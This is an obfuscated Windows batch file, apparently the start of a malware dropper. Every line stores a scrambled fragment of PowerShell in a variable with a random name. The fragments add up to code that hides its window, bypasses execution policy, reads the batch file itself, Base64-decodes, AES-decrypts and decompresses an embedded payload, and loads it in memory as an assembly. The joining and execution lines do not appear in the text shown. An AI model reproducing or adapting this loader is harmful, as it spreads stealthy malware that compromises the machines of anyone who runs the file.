@echo off
!ylcZRSaazKhvJNCRmVDB! "YjqpjvpNVe=join"
!ylcZRSaazKhvJNCRmVDB! "YRrVqhkgDN=($an"
!ylcZRSaazKhvJNCRmVDB! "FZndznGjil=s -c"
!ylcZRSaazKhvJNCRmVDB! "xgODIwNXFE=_var"
!ylcZRSaazKhvJNCRmVDB! "MjlEQGgvhX=ar.I"
!ylcZRSaazKhvJNCRmVDB! "mMnChGScfl=tsWi"
!ylcZRSaazKhvJNCRmVDB! "kvCmyBPcaN=O.Me"
!ylcZRSaazKhvJNCRmVDB! "YkgdhGIKYn=trin"
!ylcZRSaazKhvJNCRmVDB! "EuOsNZlKST=XWNs"
!ylcZRSaazKhvJNCRmVDB! "edmlJYnkMm=m;	$"
!ylcZRSaazKhvJNCRmVDB! "buvPBPAhpq=($pa"
!ylcZRSaazKhvJNCRmVDB! "EwjcIXgohx=] -j"
!ylcZRSaazKhvJNCRmVDB! "cpBlMLZZly= exe"
!ylcZRSaazKhvJNCRmVDB! "pdtsGlVDPI=embl"
!ylcZRSaazKhvJNCRmVDB! "TGOWlMikvl=ert]"
!ylcZRSaazKhvJNCRmVDB! "lQmXbnQMxi=es_v"
!ylcZRSaazKhvJNCRmVDB! "CvuTxUfKup=aram"
!ylcZRSaazKhvJNCRmVDB! "pTGckDBceQ=tS46"
!ylcZRSaazKhvJNCRmVDB! "hIfGOHoNfq='')("
!ylcZRSaazKhvJNCRmVDB! "GjJNCfIZOL=r.Mo"
!ylcZRSaazKhvJNCRmVDB! "iyxJfNwdHq=CqwE"
!ylcZRSaazKhvJNCRmVDB! "LYepuaCBsl=s_va"
!ylcZRSaazKhvJNCRmVDB! "bEfwfZNnTI=aram"
!ylcZRSaazKhvJNCRmVDB! "FQPjkphHDQ=qWIK"
!ylcZRSaazKhvJNCRmVDB! "ujOUamqCZZ=$dec"
!ylcZRSaazKhvJNCRmVDB! "rXpPrswHob=::('"
!ylcZRSaazKhvJNCRmVDB! "efAXmGerGm=ypt_"
!ylcZRSaazKhvJNCRmVDB! "BcctviQLPE=oin "
!ylcZRSaazKhvJNCRmVDB! "PJAzqWKlfc=');	"
!ylcZRSaazKhvJNCRmVDB! "aFVIZfYWMK=en -"
!ylcZRSaazKhvJNCRmVDB! "YagKDVHhNn=V=[S"
!ylcZRSaazKhvJNCRmVDB! "YToNvAkuqV=($pa"
!ylcZRSaazKhvJNCRmVDB! "EqhXSyJZhV=yte["
!ylcZRSaazKhvJNCRmVDB! "XEJEJbZfFU=Cryp"
!ylcZRSaazKhvJNCRmVDB! "EUdAtFcxBv=[Sys"
!ylcZRSaazKhvJNCRmVDB! "TtiRnItpLP=g[]]"
!ylcZRSaazKhvJNCRmVDB! "aBnTLJtJQk=yste"
!ylcZRSaazKhvJNCRmVDB! "cSqRqODEuf=ar;}"
!ylcZRSaazKhvJNCRmVDB! "rpBRYhjzAy=ity."
!ylcZRSaazKhvJNCRmVDB! "xNSXxSIooE=n.Co"
!ylcZRSaazKhvJNCRmVDB! "qDAxHJOEOb=tem."
!ylcZRSaazKhvJNCRmVDB! "BKzlAgAUrI=bqOt"
!ylcZRSaazKhvJNCRmVDB! "PEHnhLopMY=rypt"
!ylcZRSaazKhvJNCRmVDB! "OFCynPMObc=tion"
!ylcZRSaazKhvJNCRmVDB! "GDtZCDlATb=, $p"
!ylcZRSaazKhvJNCRmVDB! "SgMJgtDKQs=.ToA"
!ylcZRSaazKhvJNCRmVDB! "TDDadPQdwg=tion"
!ylcZRSaazKhvJNCRmVDB! "aBdytRxEET=s_va"
!ylcZRSaazKhvJNCRmVDB! "JSPLZWqDoa=s_va"
!ylcZRSaazKhvJNCRmVDB! "NtoOrJMdMH=ss_f"
!ylcZRSaazKhvJNCRmVDB! "yBbHPJYRfD= '')"
!ylcZRSaazKhvJNCRmVDB! "PaWRAokoTW=esaB"
!ylcZRSaazKhvJNCRmVDB! "IREyMrGCFH=orF'"
!ylcZRSaazKhvJNCRmVDB! "nkICIenbLB=[-1."
!ylcZRSaazKhvJNCRmVDB! "KwgyxXJWVL=K=$i"
!ylcZRSaazKhvJNCRmVDB! "TPhuUaPkvF=;		b"
!ylcZRSaazKhvJNCRmVDB! "GChPxTimLp='')("
!ylcZRSaazKhvJNCRmVDB! "YBlIvhyyeu=-16]"
!ylcZRSaazKhvJNCRmVDB! "CxRFZhPxas=oryS"
!ylcZRSaazKhvJNCRmVDB! "cqWtACLzSB=ert]"
!ylcZRSaazKhvJNCRmVDB! "QZcRBomsRr=nirt"
!ylcZRSaazKhvJNCRmVDB! "riVkXqoDnX=Vdmg"
!ylcZRSaazKhvJNCRmVDB! "LlEZyoFowe=wtTp"
!ylcZRSaazKhvJNCRmVDB! "dmbPYTawpE=aes_"
!ylcZRSaazKhvJNCRmVDB! "RUwiQeGBCL=func"
!ylcZRSaazKhvJNCRmVDB! "LtIKxawXSD=d) {"
!ylcZRSaazKhvJNCRmVDB! "ZKOOItMybp=ormF"
!ylcZRSaazKhvJNCRmVDB! "jfAFEljbdN=($an"
!ylcZRSaazKhvJNCRmVDB! "JOiARYjCej=gMod"
!ylcZRSaazKhvJNCRmVDB! "tKhDeaVRgA=var."
!ylcZRSaazKhvJNCRmVDB! "kpZqDYkscP=n (["
!ylcZRSaazKhvJNCRmVDB! "eLuYHrLfzg=exec"
!ylcZRSaazKhvJNCRmVDB! "jNpcCoHmwk=ram_"
!ylcZRSaazKhvJNCRmVDB! "BhzcSTJtxj=em.S"
!ylcZRSaazKhvJNCRmVDB! "QZQcDbmEuu=	$XW"
!ylcZRSaazKhvJNCRmVDB! "EZrCgcdBvX=m.Co"
!ylcZRSaazKhvJNCRmVDB! "xofGAoIqqL=mg.S"
!ylcZRSaazKhvJNCRmVDB! "UEIcEDOpYR=	$js"
!ylcZRSaazKhvJNCRmVDB! "VgMlkhInaA=de=["
!ylcZRSaazKhvJNCRmVDB! "aXSJnNtXzh= '%~f0'"
!ylcZRSaazKhvJNCRmVDB! "nRUCTFLGOL=6] -"
!ylcZRSaazKhvJNCRmVDB! "KroklzEpfv=ssio"
!ylcZRSaazKhvJNCRmVDB! "kEHJKQBJPe=	if "
!ylcZRSaazKhvJNCRmVDB! "CqOaVmlKyQ=d2_v"
!ylcZRSaazKhvJNCRmVDB! "ZfjnlRijAD=am_v"
!ylcZRSaazKhvJNCRmVDB! "DIpZnXEvzZ=iron"
!ylcZRSaazKhvJNCRmVDB! "WOMLUcPeHV=mory"
!ylcZRSaazKhvJNCRmVDB! "HyTQOSTtqK=vRUQ"
!ylcZRSaazKhvJNCRmVDB! "BScddbpvua=aram"
!ylcZRSaazKhvJNCRmVDB! "bbohetjlUP=PxVh"
!ylcZRSaazKhvJNCRmVDB! "ZwJKjNGKtr=Cryp"
!ylcZRSaazKhvJNCRmVDB! "RzjcgZwBZe=.Raw"
!ylcZRSaazKhvJNCRmVDB! "mSBXTDTpzM=ar=$"
!ylcZRSaazKhvJNCRmVDB! "yVTFKBWFKM=;	$n"
!ylcZRSaazKhvJNCRmVDB! "UQxZxmMppb=oin "
!ylcZRSaazKhvJNCRmVDB! "TCRhrmnsVM=yle "
!ylcZRSaazKhvJNCRmVDB! "fDXAJUZFCR=($pa"
!ylcZRSaazKhvJNCRmVDB! "vuyjrjviSI=[Sys"
!ylcZRSaazKhvJNCRmVDB! "gKInLKoXqP=aBmo"
!ylcZRSaazKhvJNCRmVDB! "mccCKGGPNx=gnir"
!ylcZRSaazKhvJNCRmVDB! "xkvqqZBmKU=ompr"
!ylcZRSaazKhvJNCRmVDB! "DwDfBHmsCG=jsCu"
!ylcZRSaazKhvJNCRmVDB! "jNjElZULuV= ([C"
!ylcZRSaazKhvJNCRmVDB! "oLshTTcaoH=,$pa"
!ylcZRSaazKhvJNCRmVDB! "xiOTZcHIEo=ypas"
!ylcZRSaazKhvJNCRmVDB! "BaYOvRgrTN=tQ=="
!ylcZRSaazKhvJNCRmVDB! "TCNJRtEgJL=ment"
!ylcZRSaazKhvJNCRmVDB! "pVxRdiMEHL=ct S"
!ylcZRSaazKhvJNCRmVDB! "QYZPOCWpeu=y.Pa"
!ylcZRSaazKhvJNCRmVDB! "KubwlxgOzm=gnir"
!ylcZRSaazKhvJNCRmVDB! "APmppnfweZ=reat"
!ylcZRSaazKhvJNCRmVDB! "jJSDLMtKgo=N);	"
!ylcZRSaazKhvJNCRmVDB! "FNYXyVAmyg=fore"
!ylcZRSaazKhvJNCRmVDB! "pobQDbzicW=pres"
!ylcZRSaazKhvJNCRmVDB! "lilasrszXJ=var."
!ylcZRSaazKhvJNCRmVDB! "hBTUWBTlPv=trea"
!ylcZRSaazKhvJNCRmVDB! "BbBBWdMGlk=.Cry"
!ylcZRSaazKhvJNCRmVDB! "VhCvRPPKci=cute"
!ylcZRSaazKhvJNCRmVDB! "hyEIVXXkiV=tion"
!ylcZRSaazKhvJNCRmVDB! "eyMWXGKQSo=ity."
!ylcZRSaazKhvJNCRmVDB! "igSGsLCCwp= dec"
!ylcZRSaazKhvJNCRmVDB! "gqByoVcmKG=);	$"
!ylcZRSaazKhvJNCRmVDB! "cLFaJlASRk=Subs"
!ylcZRSaazKhvJNCRmVDB! "svwsHXXtzS=or_v"
!ylcZRSaazKhvJNCRmVDB! "POihiBmMNH=ispo"
!ylcZRSaazKhvJNCRmVDB! "PUzaTGKbdh=(dec"
!ylcZRSaazKhvJNCRmVDB! "hTUJOlKBug=nver"
!ylcZRSaazKhvJNCRmVDB! "xOZmhuvRlK=var."
!ylcZRSaazKhvJNCRmVDB! "YEaofyMqfw=jtAx"
!ylcZRSaazKhvJNCRmVDB! "dplHwnystq=hidd"
!ylcZRSaazKhvJNCRmVDB! "gmOMQKLxNX=func"
!ylcZRSaazKhvJNCRmVDB! "WkCsLVcKCN=yste"
!ylcZRSaazKhvJNCRmVDB! "GYRdYCslLc=aylo"
!ylcZRSaazKhvJNCRmVDB! "jQlltxSeUk=mpre"
!ylcZRSaazKhvJNCRmVDB! "VyWIXFHCbY=Conv"
!ylcZRSaazKhvJNCRmVDB! "taoZKhJRcc=ssio"
!ylcZRSaazKhvJNCRmVDB! "srGJoNNPmR=[-1."
!ylcZRSaazKhvJNCRmVDB! "LnoVBFjMqF=inal"
!ylcZRSaazKhvJNCRmVDB! "yIIFcxySnp=Deco"
!ylcZRSaazKhvJNCRmVDB! "VVLvpckhwo='[-1"
!ylcZRSaazKhvJNCRmVDB! "pksBxjUIJK=[Env"
!ylcZRSaazKhvJNCRmVDB! "rjYaRkJOJM=n($p"
!ylcZRSaazKhvJNCRmVDB! "AGHRxuMPLT=g=')"
!ylcZRSaazKhvJNCRmVDB! "ErXOyQuNON=ewLi"
!ylcZRSaazKhvJNCRmVDB! "ylvBGFgQbR=ecom"
!ylcZRSaazKhvJNCRmVDB! "itweRfHlxG=ram_"
!ylcZRSaazKhvJNCRmVDB! "XKhvSkmbiS=ke($"
!ylcZRSaazKhvJNCRmVDB! "ZUvjinWVyW={	$a"
!ylcZRSaazKhvJNCRmVDB! "VgCwyQzVjk=){	$"
!ylcZRSaazKhvJNCRmVDB! "YoXoOEtFhm=le -"
!ylcZRSaazKhvJNCRmVDB! "PqVLpAbhgg=uG.D"
!ylcZRSaazKhvJNCRmVDB! "ehiHLJmtCO=ss);"
!ylcZRSaazKhvJNCRmVDB! "mNmHsgJaBc=ep b"
!ylcZRSaazKhvJNCRmVDB! "ssulZcGNxk=th);"
!ylcZRSaazKhvJNCRmVDB! "JcrCQbinbO=;	}}"
!ylcZRSaazKhvJNCRmVDB! "EKeNvXGlSo=rypt"
!ylcZRSaazKhvJNCRmVDB! "UhxEuSAdxf=])))"
!ylcZRSaazKhvJNCRmVDB! "FLjftfCnLJ=	$nT"
!ylcZRSaazKhvJNCRmVDB! "kOtrBoEUGW=Oab7"
!ylcZRSaazKhvJNCRmVDB! "ymCrEpbyqj=New-"
!ylcZRSaazKhvJNCRmVDB! "YOnBkxyfWG=var)"
!ylcZRSaazKhvJNCRmVDB! "XFFSFIEiAK=ypto"
!ylcZRSaazKhvJNCRmVDB! "kGwnemlUwJ=rity"
!ylcZRSaazKhvJNCRmVDB! "HJdNSWjukr=Padd"
!ylcZRSaazKhvJNCRmVDB! "fLoZCdAdoM=flec"
!ylcZRSaazKhvJNCRmVDB! "bfyKnAiZWD=-Obj"
!ylcZRSaazKhvJNCRmVDB! "lhvDdjORYF=)));"
!ylcZRSaazKhvJNCRmVDB! "PmZGlEtqsG=n $p"
!ylcZRSaazKhvJNCRmVDB! "qTesEFYlHE=$nTI"
!ylcZRSaazKhvJNCRmVDB! "QKCQuFQBWF=wtTp"
!ylcZRSaazKhvJNCRmVDB! "gMDhEsSrNs=$KVd"
!ylcZRSaazKhvJNCRmVDB! "ESuNeLAkmH=retu"
!ylcZRSaazKhvJNCRmVDB! "UznuhuUTkb=reak"
!ylcZRSaazKhvJNCRmVDB! "BEaPervXhE=Ddgb"
!ylcZRSaazKhvJNCRmVDB! "QZYGgBCIji=k($p"
!ylcZRSaazKhvJNCRmVDB! "BErTifFNet=aes_"
!ylcZRSaazKhvJNCRmVDB! "TJAwAsvzPC=wtTp"
!ylcZRSaazKhvJNCRmVDB! "tKaujjiNuM=tem."
!ylcZRSaazKhvJNCRmVDB! "WkmLJfHVFj=retu"
!ylcZRSaazKhvJNCRmVDB! "TbYCYENjjE=load"
!ylcZRSaazKhvJNCRmVDB! "pHoIOblXub=::('"
!ylcZRSaazKhvJNCRmVDB! "YanRVlbEIQ=;$Cq"
!ylcZRSaazKhvJNCRmVDB! "HLGfzRPqYh=ddin"
!ylcZRSaazKhvJNCRmVDB! "wpYWsYOnmC=_fun"
!ylcZRSaazKhvJNCRmVDB! "cZqtdrLQMD=Syst"
!ylcZRSaazKhvJNCRmVDB! "IPqaHObJdV=);	$"
!ylcZRSaazKhvJNCRmVDB! "FyVGVvgsEK=(,[s"
!ylcZRSaazKhvJNCRmVDB! "feDPalXVco=trea"
!ylcZRSaazKhvJNCRmVDB! "CXYyAJiqeX=XG47"
!ylcZRSaazKhvJNCRmVDB! "IAiSpLAKGd=wind"
!ylcZRSaazKhvJNCRmVDB! "TOfjblbVHA=mpre"
!ylcZRSaazKhvJNCRmVDB! "NLGgvzjxiC=ar=["
!ylcZRSaazKhvJNCRmVDB! "zzRpOhCDsI=ion "
!ylcZRSaazKhvJNCRmVDB! "LQGYKUatxh=::('"
!ylcZRSaazKhvJNCRmVDB! "yJUSuIIxWu=esaB"
!ylcZRSaazKhvJNCRmVDB! "hZGHHovQGK=::CB"
!ylcZRSaazKhvJNCRmVDB! "UiZtHLXSQU=-1.."
!ylcZRSaazKhvJNCRmVDB! "SgMPfgHDeA=irtS"
!ylcZRSaazKhvJNCRmVDB! "jSfyXscOqv=, [I"
!ylcZRSaazKhvJNCRmVDB! "lgtjveQyTa=ose("
!ylcZRSaazKhvJNCRmVDB! "RnsOqEqiaw=$pay"
!ylcZRSaazKhvJNCRmVDB! "SBjHOGgydD=r=[s"
!ylcZRSaazKhvJNCRmVDB! "tjEoIXLZhA=ad2_"
!ylcZRSaazKhvJNCRmVDB! "tELclHnIrl=ansf"
!ylcZRSaazKhvJNCRmVDB! "UzxIZcSIYf=d1_v"
!ylcZRSaazKhvJNCRmVDB! "tJiZnzFrLO=morF"
!ylcZRSaazKhvJNCRmVDB! "RizYuOkQjZ=em.I"
!ylcZRSaazKhvJNCRmVDB! "ZyqjRnYnVD=Syst"
!ylcZRSaazKhvJNCRmVDB! "mpNitcNGUG=tS46"
!ylcZRSaazKhvJNCRmVDB! "sBLBowhBjp=pose"
!ylcZRSaazKhvJNCRmVDB! "ZLigphCHFe=$hos"
!ylcZRSaazKhvJNCRmVDB! "xuRXfuJQiP=saBm"
!ylcZRSaazKhvJNCRmVDB! "qipIgmXeGX=in $"
!ylcZRSaazKhvJNCRmVDB! "lwVapQgTNZ=nMod"
!ylcZRSaazKhvJNCRmVDB! "zPzdJYotPQ=IKN="
!ylcZRSaazKhvJNCRmVDB! "qysRJZNwnc=var."
!ylcZRSaazKhvJNCRmVDB! "nVBCEMkYnG=t.UI"
!ylcZRSaazKhvJNCRmVDB! "YiZBhcPzXQ=7;	$"
!ylcZRSaazKhvJNCRmVDB! "uJoSJpblgI=ds_v"
!ylcZRSaazKhvJNCRmVDB! "GEawZuROEO=txeT"
!ylcZRSaazKhvJNCRmVDB! "AkGJqxUtTe=-nop"
!ylcZRSaazKhvJNCRmVDB! "OjIlgCpBJO=)([b"
!ylcZRSaazKhvJNCRmVDB! "ZRpJFUagtV=46es"
!ylcZRSaazKhvJNCRmVDB! "VKKPLnWdTf=Obje"
!ylcZRSaazKhvJNCRmVDB! "wmdEwriLiP=('\'"
!ylcZRSaazKhvJNCRmVDB! "RJnpXTTxvg= -jo"
!ylcZRSaazKhvJNCRmVDB! "lxcsNVhAwE=se()"
!ylcZRSaazKhvJNCRmVDB! "tYvDnqwRfA=ctio"
!ylcZRSaazKhvJNCRmVDB! "yGmPSsvFLn=wEd="
!ylcZRSaazKhvJNCRmVDB! "yBsMjWpuwj=_var"
!ylcZRSaazKhvJNCRmVDB! "dcBPxooQaR=ect "
